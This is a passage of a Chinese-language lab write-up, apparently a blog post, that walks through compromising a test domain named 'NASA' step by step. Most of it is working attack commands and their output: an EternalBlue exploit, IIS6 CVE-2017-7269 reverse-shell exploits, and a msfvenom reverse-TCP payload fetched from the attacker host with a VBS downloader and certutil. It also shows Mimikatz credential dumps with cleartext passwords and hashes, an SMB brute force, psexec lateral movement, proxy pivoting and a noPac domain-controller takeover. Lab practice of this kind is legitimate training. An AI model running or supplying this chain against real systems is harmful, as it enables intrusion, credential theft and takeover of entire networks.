<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br><span class="line">set pyaload windows&#x2F;meterpreter&#x2F;bind_tcp </span><br><span class="line">#选择正向shell </span><br><span class="line">set rhosts 192.168.59.197 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/26.png" alt></p>
<h4 id="iis6-0-溢出获取权限"><a href="#iis6-0-溢出获取权限" class="headerlink" title="iis6.0 溢出获取权限"></a>iis6.0 溢出获取权限</h4><p><img data-src="./NASA/27.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/lcatro/CVE-2017-7269-Echo-PoC/master/CVE-2017-7269_remote_echo.py</span><br><span class="line"></span><br><span class="line">proxychains4 python2 CVE-2017-7269_remote_echo.py 192.168.59.144</span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell</span><br><span class="line"></span><br><span class="line">proxychains4 python2 exp.py 192.168.59.144 80 192.168.59.138 6667</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到权限</li>
</ul>
<p><img data-src="./NASA/28.png" alt></p>
<p><img data-src="./NASA/29.png" alt></p>
<ul>
<li>生成msf-shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.59.138 lport=7778 -f exe -o laotieshell.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>vbs下载后门</li>
<li>有点小问题</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.se nd:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; downfile.vbs</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript downfile.vbs http:&#x2F;&#x2F;192.168.59.138:8000&#x2F;laotieshell.exe.rar 2.exe</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.59.138:8000/laotieshell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.59.138</span><br><span class="line">set LPORT 7778</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>

<ul>
<li>可以下载执行，就是给不到msfshell，绕过</li>
</ul>
<h4 id="S09-020-KB970483-CVE-2009-1535-IIS6-2003-提权"><a href="#S09-020-KB970483-CVE-2009-1535-IIS6-2003-提权" class="headerlink" title="S09-020-KB970483-CVE-2009-1535-IIS6 2003 提权"></a>S09-020-KB970483-CVE-2009-1535-IIS6 2003 提权</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">upload /root/moonsec/nasa/IIS6.0.exe</span><br><span class="line"></span><br><span class="line">IIS6.0.exe whoami</span><br></pre></td></tr></table></figure>

<ul>
<li>拿下win2003主机</li>
</ul>
<h4 id="win2003信息收集"><a href="#win2003信息收集" class="headerlink" title="win2003信息收集"></a>win2003信息收集</h4><ul>
<li><code>load kiwi</code> </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 745106 (00000000:000b5e92)</span><br><span class="line">Session           : NetworkCleartext from 0</span><br><span class="line">User Name         : IUSR_WWW-79FA760B73D</span><br><span class="line">Domain            : WIN2003</span><br><span class="line">Logon Server      : WIN2003</span><br><span class="line">Logon Time        : 2022-5-1 0:48:21</span><br><span class="line">SID               : S-1-5-21-3636755759-1784588792-1154290278-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000002] Primary</span><br><span class="line">         * Username : IUSR_WWW-79FA760B73D</span><br><span class="line">         * Domain   : WIN2003</span><br><span class="line">         * LM       : a1323e561696c32ad68862a8c0118e7e</span><br><span class="line">         * NTLM     : 00dd987a1d0c4540f919b3eb5fc0b1cd</span><br><span class="line">         * SHA1     : e667cef8b822d775d96b16d8d0fa13a9a6c5c2e6</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : IUSR_WWW-79FA760B73D</span><br><span class="line">         * Domain   : WIN2003</span><br><span class="line">         * Password : eadL:&#125;Yl5COK6z</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : IUSR_WWW-79FA760B73D</span><br><span class="line">         * Domain   : WIN2003</span><br><span class="line">         * Password : eadL:&#125;Yl5COK6z</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : NETWORK SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022-1-14 13:07:43</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000002] Primary</span><br><span class="line">         * Username : WIN2003$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * LM       : aad3b435b51404eeaad3b435b51404ee</span><br><span class="line">         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2003$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win2003$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 52026 (00000000:0000cb3a)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022-1-14 13:07:43</span><br><span class="line">SID               : </span><br><span class="line">        msv :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 157291 (00000000:0002666b)</span><br><span class="line">Session           : Interactive from 0</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WIN2003</span><br><span class="line">Logon Server      : WIN2003</span><br><span class="line">Logon Time        : 2022-1-14 13:07:59</span><br><span class="line">SID               : S-1-5-21-3636755759-1784588792-1154290278-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000002] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WIN2003</span><br><span class="line">         * LM       : 6c634e36565f85fc9c5014ae4718a7ee</span><br><span class="line">         * NTLM     : f099c4a637f9b871487bbb03962f79b5</span><br><span class="line">         * SHA1     : 4df4d4101487c8266ecc4b7174affa548cbd56c3</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WIN2003</span><br><span class="line">         * Password : admin555</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WIN2003</span><br><span class="line">         * Password : admin555</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022-1-14 13:07:43</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN2003$</span><br><span class="line">Domain            : WORKGROUP</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022-1-14 13:07:43</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win2003$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:6c634e36565f85fc9c5014ae4718a7ee:f099c4a637f9b871487bbb03962f79b5:::</span><br><span class="line">ASPNET:1006:c5f4c32e080b1c0a19f45641a62db986:5643281884dd972acd9b0eaeecd13522:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">IUSR_WWW-79FA760B73D:1000:a1323e561696c32ad68862a8c0118e7e:00dd987a1d0c4540f919b3eb5fc0b1cd:::</span><br><span class="line">IWAM_WWW-79FA760B73D:1001:123dec921ecc0ca82f1106015d8abba7:556f2d1b30d88fc35eb8c4d573a5cd14:::</span><br><span class="line">SUPPORT_388945a0:1004:aad3b435b51404eeaad3b435b51404ee:f739006531fcc09af8615f9575fa943c:::</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到账号密码 <code>Administrator / admin555</code></li>
</ul>
<h3 id="域控-amp-amp-win7"><a href="#域控-amp-amp-win7" class="headerlink" title="域控&amp;&amp;win7"></a>域控&amp;&amp;win7</h3><h4 id="继续横向到10网段"><a href="#继续横向到10网段" class="headerlink" title="继续横向到10网段"></a>继续横向到10网段</h4><ul>
<li><code>ifconfig</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 65539</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:e8:dd:45</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.10.10.137</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 65540</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:e8:dd:3b</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.59.144</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br></pre></td></tr></table></figure>

<ul>
<li>探测主机</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nbtscan.exe -r 192.168.59.0/24</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\WINDOWS\Temp&gt;nbtscan.exe -r 192.168.59.0/24</span><br><span class="line">nbtscan.exe -r 192.168.59.0/24</span><br><span class="line">192.168.59.0    Sendto failed: No error</span><br><span class="line">192.168.59.138  Recvfrom failed: No error</span><br><span class="line">192.168.59.128  Recvfrom failed: No error</span><br><span class="line">Warning: -r option not supported under Windows. Running without it.</span><br><span class="line"></span><br><span class="line">Doing NBT name scan for addresses from 192.168.59.0/24</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">192.168.59.1     DESKTOP-PDLJJFK  &lt;server&gt;  &lt;unknown&gt;        00-50-56-c0-00-08</span><br><span class="line">192.168.59.144   WIN2003          &lt;server&gt;  &lt;unknown&gt;        00-0c-29-e8-dd-3b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nbtscan.exe -r 10.10.10.0/24</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\WINDOWS\Temp&gt;nbtscan.exe -r 10.10.10.0/24</span><br><span class="line">nbtscan.exe -r 10.10.10.0/24</span><br><span class="line">10.10.10.0      Sendto failed: No error</span><br><span class="line">Warning: -r option not supported under Windows. Running without it.</span><br><span class="line"></span><br><span class="line">Doing NBT name scan for addresses from 10.10.10.0/24</span><br><span class="line"></span><br><span class="line">IP address       NetBIOS Name     Server    User             MAC address      </span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">10.10.10.1       DESKTOP-PDLJJFK  &lt;server&gt;  &lt;unknown&gt;        00-50-56-c0-00-13</span><br><span class="line">10.10.10.137     WIN2003          &lt;server&gt;  &lt;unknown&gt;        00-0c-29-e8-dd-45</span><br><span class="line">10.10.10.142     WIN7             &lt;server&gt;  &lt;unknown&gt;        00-0c-29-e8-44-f8</span><br><span class="line">10.10.10.140     AD01             &lt;server&gt;  &lt;unknown&gt;        00-0c-29-a3-b3-ec</span><br><span class="line">10.10.10.141     AD02             &lt;server&gt;  &lt;unknown&gt;        00-0c-29-d9-66-fd</span><br></pre></td></tr></table></figure>

<h4 id="smb爆破"><a href="#smb爆破" class="headerlink" title="smb爆破"></a>smb爆破</h4><ul>
<li>用户列表</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">administrator</span><br><span class="line">WIN2003</span><br><span class="line">AD01</span><br><span class="line">AD02</span><br><span class="line">WIN7</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use scanner/smb/smb_login</span><br><span class="line"></span><br><span class="line">set RHOSTS 192.168.59.128</span><br><span class="line"></span><br><span class="line">set SMBPass admin555</span><br><span class="line"></span><br><span class="line">set USERPASS_FILE /root/moonsec/nasa/user.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到win7 smb用户名密码 <code>WIN7:admin555</code></li>
</ul>
<h4 id="ms17-010-psexec-登录"><a href="#ms17-010-psexec-登录" class="headerlink" title="ms17_010_psexec 登录"></a>ms17_010_psexec 登录</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use windows/smb/ms17_010_psexec </span><br><span class="line">set payload windows/meterpreter/bind_tcp </span><br><span class="line">set smbuser win7 </span><br><span class="line">set smbpass admin555 </span><br><span class="line"></span><br><span class="line">set RHOST 192.168.59.197</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/30.png" alt></p>
<h4 id="域内机器信息收集"><a href="#域内机器信息收集" class="headerlink" title="域内机器信息收集"></a>域内机器信息收集</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">migrate 2492</span><br><span class="line"></span><br><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1056343 (00000000:00101e57)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : test</span><br><span class="line">Domain            : NASA</span><br><span class="line">Logon Server      : AD01</span><br><span class="line">Logon Time        : 2022/1/11 16:11:04</span><br><span class="line">SID               : S-1-5-21-320502414-1314547354-1033589243-1134</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : test</span><br><span class="line">         * Domain   : NASA</span><br><span class="line">         * LM       : a071457d1ede2871a365438a9412e9f4</span><br><span class="line">         * NTLM     : 59e3c9f97af3f257b02409bbf3b2da11</span><br><span class="line">         * SHA1     : c4eb781da81b515f7d68f68044e97ac00e1d7085</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : test</span><br><span class="line">         * Domain   : NASA</span><br><span class="line">         * Password : QWEasd!@#999</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : test</span><br><span class="line">         * Domain   : NASA</span><br><span class="line">         * Password : QWEasd!@#999</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : test</span><br><span class="line">         * Domain   : NASA.GOV</span><br><span class="line">         * Password : QWEasd!@#999</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 867448 (00000000:000d3c78)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : win7</span><br><span class="line">Domain            : WIN7</span><br><span class="line">Logon Server      : WIN7</span><br><span class="line">Logon Time        : 2022/1/11 16:10:04</span><br><span class="line">SID               : S-1-5-21-1323724323-825390049-2571486981-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : win7</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * LM       : 6c634e36565f85fc9c5014ae4718a7ee</span><br><span class="line">         * NTLM     : f099c4a637f9b871487bbb03962f79b5</span><br><span class="line">         * SHA1     : 4df4d4101487c8266ecc4b7174affa548cbd56c3</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : win7</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : admin555</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : win7</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : admin555</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win7</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : admin555</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 867417 (00000000:000d3c59)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : win7</span><br><span class="line">Domain            : WIN7</span><br><span class="line">Logon Server      : WIN7</span><br><span class="line">Logon Time        : 2022/1/11 16:10:04</span><br><span class="line">SID               : S-1-5-21-1323724323-825390049-2571486981-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : win7</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * LM       : 6c634e36565f85fc9c5014ae4718a7ee</span><br><span class="line">         * NTLM     : f099c4a637f9b871487bbb03962f79b5</span><br><span class="line">         * SHA1     : 4df4d4101487c8266ecc4b7174affa548cbd56c3</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : win7</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : admin555</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : win7</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : admin555</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win7</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : admin555</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/11 15:58:24</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : NASA</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/11 15:58:24</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : WIN7$</span><br><span class="line">         * Domain   : NASA</span><br><span class="line">         * NTLM     : 333cea36571ef793c5cd038053bcc3f3</span><br><span class="line">         * SHA1     : 01ff24382b6bf6ebfd1eff64ad23a579b4e09d7e</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN7$</span><br><span class="line">         * Domain   : NASA</span><br><span class="line">         * Password : 8d a8 1c d9 70 b7 2f 0a f0 4a 82 b8 81 2a 2c 26 f4 0a 48 14 19 ce cd 80 70 43 45 90 25 a5 22 81 7e ca e0 7d f7 cb d2 03 5f 0b c9 54 38 94 29 cf 3a 55 51 bf 77 63 94 33 33 90 aa 1c 93 da ba d3 24 f8 c9 74 1c cd b2 00 1f 07 25 34 73 51 22 77 c0 3b 3c 56 6c cd 4d 6c b1 f4 f7 40 b3 f0 5c c7 8f 2b 6d 82 a9 34 b5 c8 00 d7 4a ef d8 cb cb 8b 1f 4c 48 21 ba ce a8 50 34 a2 11 2e 5a 62 b4 25 e5 f9 ee 93 de 72 69 97 92 dc 6f 04 ec 94 78 f2 4f 69 75 a1 93 27 1f f9 8b dd 8e e6 ba 08 d6 94 1a fb 7c 68 c6 7d 11 44 19 09 6e 81 b6 51 65 d3 ff c3 4a 3f fd ee cd 15 fa 07 2a e0 1b d6 13 85 73 d4 5e 5a 3c 12 c6 b0 7f c1 a7 1f 8a 7c 98 b5 9b 6b a7 ca 51 75 4a aa af 09 bc ec 54 da 3d 49 3c a4 5a 35 dd e0 e1 ec b4 87 df 68 d9 cf 30 10 </span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win7$</span><br><span class="line">         * Domain   : NASA.GOV</span><br><span class="line">         * Password : 8d a8 1c d9 70 b7 2f 0a f0 4a 82 b8 81 2a 2c 26 f4 0a 48 14 19 ce cd 80 70 43 45 90 25 a5 22 81 7e ca e0 7d f7 cb d2 03 5f 0b c9 54 38 94 29 cf 3a 55 51 bf 77 63 94 33 33 90 aa 1c 93 da ba d3 24 f8 c9 74 1c cd b2 00 1f 07 25 34 73 51 22 77 c0 3b 3c 56 6c cd 4d 6c b1 f4 f7 40 b3 f0 5c c7 8f 2b 6d 82 a9 34 b5 c8 00 d7 4a ef d8 cb cb 8b 1f 4c 48 21 ba ce a8 50 34 a2 11 2e 5a 62 b4 25 e5 f9 ee 93 de 72 69 97 92 dc 6f 04 ec 94 78 f2 4f 69 75 a1 93 27 1f f9 8b dd 8e e6 ba 08 d6 94 1a fb 7c 68 c6 7d 11 44 19 09 6e 81 b6 51 65 d3 ff c3 4a 3f fd ee cd 15 fa 07 2a e0 1b d6 13 85 73 d4 5e 5a 3c 12 c6 b0 7f c1 a7 1f 8a 7c 98 b5 9b 6b a7 ca 51 75 4a aa af 09 bc ec 54 da 3d 49 3c a4 5a 35 dd e0 e1 ec b4 87 df 68 d9 cf 30 10 </span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 52357 (00000000:0000cc85)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/11 15:58:24</span><br><span class="line">SID               : </span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : WIN7$</span><br><span class="line">         * Domain   : NASA</span><br><span class="line">         * NTLM     : 333cea36571ef793c5cd038053bcc3f3</span><br><span class="line">         * SHA1     : 01ff24382b6bf6ebfd1eff64ad23a579b4e09d7e</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : NASA</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/1/11 15:58:24</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN7$</span><br><span class="line">         * Domain   : NASA</span><br><span class="line">         * Password : 8d a8 1c d9 70 b7 2f 0a f0 4a 82 b8 81 2a 2c 26 f4 0a 48 14 19 ce cd 80 70 43 45 90 25 a5 22 81 7e ca e0 7d f7 cb d2 03 5f 0b c9 54 38 94 29 cf 3a 55 51 bf 77 63 94 33 33 90 aa 1c 93 da ba d3 24 f8 c9 74 1c cd b2 00 1f 07 25 34 73 51 22 77 c0 3b 3c 56 6c cd 4d 6c b1 f4 f7 40 b3 f0 5c c7 8f 2b 6d 82 a9 34 b5 c8 00 d7 4a ef d8 cb cb 8b 1f 4c 48 21 ba ce a8 50 34 a2 11 2e 5a 62 b4 25 e5 f9 ee 93 de 72 69 97 92 dc 6f 04 ec 94 78 f2 4f 69 75 a1 93 27 1f f9 8b dd 8e e6 ba 08 d6 94 1a fb 7c 68 c6 7d 11 44 19 09 6e 81 b6 51 65 d3 ff c3 4a 3f fd ee cd 15 fa 07 2a e0 1b d6 13 85 73 d4 5e 5a 3c 12 c6 b0 7f c1 a7 1f 8a 7c 98 b5 9b 6b a7 ca 51 75 4a aa af 09 bc ec 54 da 3d 49 3c a4 5a 35 dd e0 e1 ec b4 87 df 68 d9 cf 30 10 </span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win7$</span><br><span class="line">         * Domain   : NASA.GOV</span><br><span class="line">         * Password : 8d a8 1c d9 70 b7 2f 0a f0 4a 82 b8 81 2a 2c 26 f4 0a 48 14 19 ce cd 80 70 43 45 90 25 a5 22 81 7e ca e0 7d f7 cb d2 03 5f 0b c9 54 38 94 29 cf 3a 55 51 bf 77 63 94 33 33 90 aa 1c 93 da ba d3 24 f8 c9 74 1c cd b2 00 1f 07 25 34 73 51 22 77 c0 3b 3c 56 6c cd 4d 6c b1 f4 f7 40 b3 f0 5c c7 8f 2b 6d 82 a9 34 b5 c8 00 d7 4a ef d8 cb cb 8b 1f 4c 48 21 ba ce a8 50 34 a2 11 2e 5a 62 b4 25 e5 f9 ee 93 de 72 69 97 92 dc 6f 04 ec 94 78 f2 4f 69 75 a1 93 27 1f f9 8b dd 8e e6 ba 08 d6 94 1a fb 7c 68 c6 7d 11 44 19 09 6e 81 b6 51 65 d3 ff c3 4a 3f fd ee cd 15 fa 07 2a e0 1b d6 13 85 73 d4 5e 5a 3c 12 c6 b0 7f c1 a7 1f 8a 7c 98 b5 9b 6b a7 ca 51 75 4a aa af 09 bc ec 54 da 3d 49 3c a4 5a 35 dd e0 e1 ec b4 87 df 68 d9 cf 30 10 </span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">win7:1000:aad3b435b51404eeaad3b435b51404ee:f099c4a637f9b871487bbb03962f79b5:::</span><br></pre></td></tr></table></figure>

<ul>
<li>迁移进程到64位</li>
</ul>
<p><img data-src="./NASA/31.png" alt></p>
<h4 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run get_local_subnets </span><br><span class="line">run autoroute -s 10.10.10.0&#x2F;255.255.255.0 </span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks_proxy</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<ul>
<li>这里使用 CVE-2021-42278 and CVE-2021-42287<a href="https://github.com/Ridter/noPac" target="_blank" rel="noopener">https://github.com/Ridter/noPac</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">QWEasd!@#999</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains4 python python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 -dc-host AD01 --impersonate administrator -dump</span><br></pre></td></tr></table></figure>

